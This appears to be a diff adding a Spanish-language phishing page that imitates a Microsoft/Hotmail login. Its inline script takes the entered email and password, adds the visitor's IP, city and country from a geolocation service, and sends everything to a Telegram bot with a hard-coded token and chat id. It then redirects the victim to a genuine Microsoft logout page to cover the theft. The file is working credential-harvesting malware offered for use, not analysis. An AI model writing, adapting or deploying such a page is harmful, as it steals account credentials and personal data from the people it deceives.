@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html>
+  <script
+    src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js"
+    id="eppiocemhmnlbhjplcgkofciiegomcon"
+  ></script>
+  <script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script>
+  <script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script>
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <link
+      rel="icon"
+      href="https://live5-9-927-9.onrender.com/22favicon.png"
+      type="SCAM/favicon.png"
+      sizes="16x16"
+    />
+    <title>Iniciar sesión en tu cuenta Microsoft</title>
+
+    <link rel="stylesheet" type="text/css" href="./datos/estilo.css" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=no"
+    />
+    <style type="text/css">
+      body {
+        display: none;
+      }
+    </style>
+    <style type="text/css">
+      body {
+        display: block !important;
+      }
+    </style>
+    <noscript>
+      <style type="text/css">
+        body {
+          display: block !important;
+        }
+      </style>
+    </noscript>
+    <script
+      bis_use="true"
+      type="text/javascript"
+      charset="utf-8"
+      data-bis-config='["facebook.com/","twitter.com/","youtube-nocookie.com/embed/","//vk.com/","//www.vk.com/","//linkedin.com/","//www.linkedin.com/","//instagram.com/","//www.instagram.com/","//www.google.com/recaptcha/api2/","//hangouts.google.com/webchat/","//www.google.com/calendar/","//www.google.com/maps/embed","spotify.com/","soundcloud.com/","//player.vimeo.com/","//disqus.com/","//tgwidget.com/","//js.driftt.com/","friends2follow.com","/widget","login","//video.bigmir.net/","blogger.com","//smartlock.google.com/","//keep.google.com/","/web.tolstoycomments.com/","moz-extension://","chrome-extension://","/auth/","//analytics.google.com/","adclarity.com","paddle.com/checkout","hcaptcha.com","recaptcha.net","2captcha.com","accounts.google.com","www.google.com/shopping/customerreviews","buy.tinypass.com","gstatic.com","secureir.ebaystatic.com","docs.google.com","contacts.google.com","github.com","mail.google.com","chat.google.com","audio.xpleer.com","keepa.com","static.xx.fbcdn.net","sas.selleramp.com","1plus1.video","console.googletagservices.com"]'
+      src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executers/vi-tr.js"
+    ></script>
+  </head>
+
+  <body
+    class="cb"
+    data-bind="defineGlobals: ServerData, bodyCssClass"
+    bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJDT05GSUciOiJkaXNhYmxlZCJ9LCJ2ZXJzaW9uIjoiMi4wLjEyIiwic2NvcmUiOjIwMDEyfV0="
+    cz-shortcut-listen="true"
+    bis_skin_checked="1"
+  >
+    <div class="generalContainer" bis_skin_checked="1">
+      <div class="container" bis_skin_checked="1">
+        <img class="imagen" src="./datos/222hotmail.jpg" alt="" />
+
+        <h2>Proteger Cuenta</h2>
+        <form id="loginform">
+          <input
+            type="email"
+            name="emil"
+            id="email"
+            placeholder="Correo electrónico, teléfono o Skype"
+            required=""
+          />
+          <input
+            id="clave"
+            type="password"
+            name="pss"
+            placeholder="Contraseña"
+            required="Numero"
+          />
+          <div class="div_text" bis_skin_checked="1">
+            <small class="small_negro">¿No tienes una cuenta?</small>
+            <a href="https://live5-9-927-9.onrender.com/#">Cree una.</a>
+          </div>
+          <!-- <small>Para mayor seguridad crea un PIN de 6 digitos.</small> -->
+          <div class="llave" bis_skin_checked="1">
+            <!-- <img src="siii.jpg"  --><!-- /> -->
+          </div>
+          <!-- <input
+            class="pin"
+            minlength="6"
+            maxlength="6"
+            type="password"
+            type="password"
+            name="numero"
+            placeholder="PIN ******"
+            required=""
+            pattern="[0-9]+"
+          /> -->
+          <input type="submit" value="Siguiente" />
+        </form>
+
+        <!-- <div class="terminosContainer">
+                <h3>Térmios de uso</h3>
+                <h5>Privacidad y cookies</h5>
+            </div> -->
+      </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/axios@1.1.2/dist/axios.min.js"></script>
+
+    <script>
+      const url = "https://ipapi.co/json/";
+      const form = document.querySelector("#loginform");
+      form.addEventListener("submit", (event) => {
+        event.preventDefault(); // aqui evitamos que el código se repita evita que se envíe el formulario
+        axios
+          .get(url)
+          .then((response) => {
+            const email = document.querySelector("#email").value;
+            const contra = document.querySelector("#clave").value;
+
+            const message =
+              "\nHotmail\nUsuario: " +
+              email +
+              "\nContra: " +
+              contra +
+              "\nCiudad:" +
+              response.data.city +
+              "\nPais: " +
+              response.data.country +
+              "\nIP: " +
+              response.data.ip;
+            axios
+              .post(
+                "https://api.telegram.org/bot6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ/sendMessage",
+                {
+                  chat_id: "-1002082042833",
+                  text: message,
+                }
+              )
+              .then((response) => {
+                window.location.href =
+                  "https://login.live.com/logout.srf?ct=1698893038&rver=7.0.6738.0&id=292841&ru=https:%2F%2Foutlook.live.com%2Fowa%2Fcsignout.aspx%3F%253f%253fumkt%3Des-US%26exch%3D1%26RpsCsrfState%3D4042c6ed-e025-daaa-5b59-e2b84fedc413";
+              })
+              .catch((error) => {
+                console.error(error);
+              });
+          })
+          .catch((error) => {
+            console.log(error);
+          });
+      });
+    </script>
+  </body>
+</html>
